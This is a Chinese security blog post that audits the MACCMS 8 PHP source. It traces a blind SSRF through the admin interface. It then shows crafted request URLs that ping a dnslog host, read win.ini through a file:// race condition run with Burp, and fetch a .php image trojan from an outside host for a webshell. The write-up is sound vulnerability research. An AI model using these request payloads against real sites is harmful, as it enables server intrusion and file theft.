> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MA7F6wb4eWVlh0t3gwvjdw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wjhr5ibe9GDCkVMJhfoIhAeTzt2U6DSNPgK6kNqBWx1838dicnDTia5485Q/640?wx_fmt=jpeg)

文章首发于奇安信攻防社区《无回显 SSRF 的奇妙审计之旅》  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

MACCMS  

好久没代码审计了，随便找了个 php 的源码审了好几天，虽然漏洞不是很难利用，但是这个过程真是超级有趣

无回显 ssrf

漏洞判断  

日常搜索 curl_exec() 函数

发现在 maccms8\inc\common\function.php 文件的 824 行发现利用了该函数

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjqSJwC90g3xjY5e55cZ4Lg381swFopKhWRhKFAhURiccaJu0JMKypTOg/640?wx_fmt=png)

观察发现 $ch 参数由 $url 传入，在 getPage() 函数中没有任何操作对 $url 进行过滤

接着就反向查找哪里调用了 getPage() 函数  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjMgcuSQcjLCIFPaFWnDiaf2Q4ILribNQK44Qg2qJibhibMqA74dh8p3MiaYg/640?wx_fmt=png)

发现调用该函数还挺多，挨个查找发现 inc\common\function.php 的 1746 行或许可以利用

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjVgPESyIxELJiaspvDWY6icFuDjFWnIXUOhCHiaV14KJYhj7rFBfn4Uf7g/640?wx_fmt=png)

此时传入的 $url 函数进行了几处截断拼接操作，也没啥过滤啥的

那就继续查找 savepic() 函数被谁调用了

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjGCVdHKtoGF0rMk3WWJObhwLgkDor53CicUJpvricz3lIN74iaGMLAh0Ug/640?wx_fmt=png)

乍一看也挺多的，我们只好挨个查看了

在 maccms8\admin1212\admin_interface.php 的第 452 行我们发现调用了该函数

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjUjBLHW0T4LwSqSLBjUChbMibToJvzDhkQStfqyYEoW3Mwn8ZFVWic2Ww/640?wx_fmt=png)

传入的参数是 $d_pic, 慢慢往上追溯发现该参数在第 66 行可以通过 be() 函数传入

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjotrEkuyqN4SlBnH566VctKNVt0uka1xaibl5XBk8q92BxQxj7HgxhOA/640?wx_fmt=png)

be() 函数干嘛用的就不展开讲了，这是该源码自己定义的函数，all 表示可以通过 get 或 post 方式接收某一参数，d_pic 就是参数值

到这，算是把这一套传参过程是给追完了，只要我们 get 传入 d_pic 就行呗？

利用过程构造

我们从开头顺着看运行过程，主要是判断需要哪些条件，可以让我们运行到漏洞处

走着走着发现在 48,50 行有个判断

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjgdEtXxic6L52M7q9ngJxCmZEzdoZ9ob8SjicMhhWaYxcl3r5EQx32dqg/640?wx_fmt=png)

$ac=vod 和 $pass 是某个值，往上看，发现这俩值都可以 get 或 post 方式传入

ac 好说传入 vod，pass 是啥啊

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjHAYu9U5IjpfAk5BIOAOcmKrdq9gUSroQdyus1mV8Xn8TYQes8plvBg/640?wx_fmt=png)

全局搜索 pass，发现是 config/config.php 的一个变量

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjJQ7EqNSVE0fCNdicciaMKDJHnz0hZlfqwaPXI3NMPf93Bus55qXxUiczA/640?wx_fmt=png)

此变量是可以在后台的站外入库配置处查看的

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjrmCz4dnGVcotmsbqwicpRwt1PTUoOiaxro8C9BIFw1oyl8gKNnQ4UmFA/640?wx_fmt=png)

然后发现 84,85 行进行了判断，不能是空，一猜就是和上面相同的方法 get 或 post 传入即可  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjDnDVCibmIGhw7LA7N2bMBAR8JLlGhEOWmhfsw8RqwohRqnpcYkicQ4IQ/640?wx_fmt=png)

然后在 446，447 行发现两个判断

```
strpos(','.$uprule,'j')
$MAC['collect']['vod']['pic']==1
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wjibof7XDdMicicO0LWH0RqSt6CqJ0ibglJ0aSFnxWhkDPNqWVBPHYgxrxtQ/640?wx_fmt=png)

这是啥啊，结合上面的 pass 也是类似判断，我猜测也是网站的配置 config.php  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wj2sDK89XWvWObiaCQxE8QzJZ9TevJSnrjHf6OwYDibxboWf5Bicdv8Icpw/640?wx_fmt=png)

需要将 pic 改为 1，所以去后台找相关操作发现采集过程中同步图片控制该参数

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjeteVwyTRyUlmiculBMJqW4AkBImL6uTm20c48rq0dHXSoE6pbdhpOYw/640?wx_fmt=png)

我们设为开启即成为 1，然后 j 是在二次更新规则处选择图片  

开始利用

到这所以流程走完了，构造的 url，尝试访问 dnslog

```
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&pass=LMB9UVWA63&d_name=1&d_type=1&d_pic=http://ckrooo.dnslog.cn
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wj6msXlEKyK7tfaMRCd46vAZADP32M4AezEzXQEVBHjJVicWOnpj9zJbg/640?wx_fmt=png)

发现新增数据成功？这是执行了 sql 注入，这里是存在 sql 注入的（但我已经提交了），不是本文重点  

再次访问一次，发现 dnslog 接收到访问了

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjbiaBQbueZia6fAC7wpgQFCPYCgzgyZSvk1pkNaOAuU0qKxSHVvWp3gqQ/640?wx_fmt=png)

（这里我们也可以停下来思考一下这个流程，为啥访问两次才接收到 dnslog 数据）  

到这虽然我们发现了 ssrf 漏洞，但是**没回显**啊

ssrf 的各种伪协议、读源码、扫内网没法玩啊，**食之无味弃之可惜**

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjiaoXjGkII5bUQkAicU5za8UascyhUyia4GRMPDSibCNRnbvXnTLjVj3CKg/640?wx_fmt=png)

峰回路转

过了两天总觉得该漏洞太气人了，没回显的 ssrf 多气人，继续挖！

继续回去看代码，发现在 inc\common\function.php 的 1749 行有一个操作，写入内容到文件? 峰回路转？

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wjkz5S8pVv3qLMq56VT5ymg2bwkZiaCkC4UCFyY15RB9KW03l4LQWFbRQ/640?wx_fmt=png)

往下继续看，发现后面进行了判断是不是图片内容  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wj8cTcvANKetVWGcOju392c9HIrUtoJH7YcIYs599u3GO2nLhsx9xgibA/640?wx_fmt=png)

不是图片就删除该文件，你说气不气人

那就先测试一下写入图片吧

```
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&pass=LMB9UVWA63&d_name=1&d_type=1&d_pic=http:xxx.123.png
```

发现图片被写入到了 /upload/vod/2021-08-18/123.png

？？？目录可猜测？文件名是原文件名?

思考半天，突然想到一个姿势，**条件竞争！**

因为该源码，我们是已经成功写入到目录下了，只是后面来了个判断给删了，但利用条件竞争我们是有机会在没删之前读取该文件的。

开始构造，使用 burp 跑

```
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&pass=LMB9UVWA63&d_name=1&d_type=1&d_pic=file:///c:/windows/win.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjCLw8NE1pwybchnoqp6ou2SmMsArftRqicyiafKVnwpqnTWuo0g34pkQw/640?wx_fmt=png)

```
http://127.0.0.1/maccms8/upload/vod/2021-08-18/win.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjxByOy6yMJLhqibdNXaTvM4M16Rp5AsAYXMiap0zDibwxiaiaFweSFvVYO6g/640?wx_fmt=png)

两个数据开跑  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjZvpWhdXdvvKLgYSwicybyE6TaFQs95A3KpX5nLnOZObGn8twcP7WsZQ/640?wx_fmt=png)

成了！

文件上传 getshell

其实这里还是有另一个洞，就是文件上传  

首先构造图片马，必须是图片马，因为文件进行了图片判断

但是，这里可以是 php 后缀！很离谱

```
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&pass=LMB9UVWA63&d_name=10&d_type=2&d_pic=http://xxx/1234.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0WjyaVb1Jj2FMatwS2Giahw9op1y2UIwK6a88GkYWLds1eQtVibVrzldjIQ/640?wx_fmt=png)

将马上传到

```
http://127.0.0.1/maccms8/upload/vod/2021-08-18/1234.php
```

成功解析  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSN3nWoZF4IbdBQic24rBs0Wj2kD66btNg0YXBIsIAmqLiciaPxOuUicspS74ckDNSHiaDtItCCTw5A3wTA/640?wx_fmt=png)

总结

真是峰回路转啊，多思考是多么的重要  

其实这个 ssrf 还有几处利用，比如 ac=art，也是需要去后台改相应配置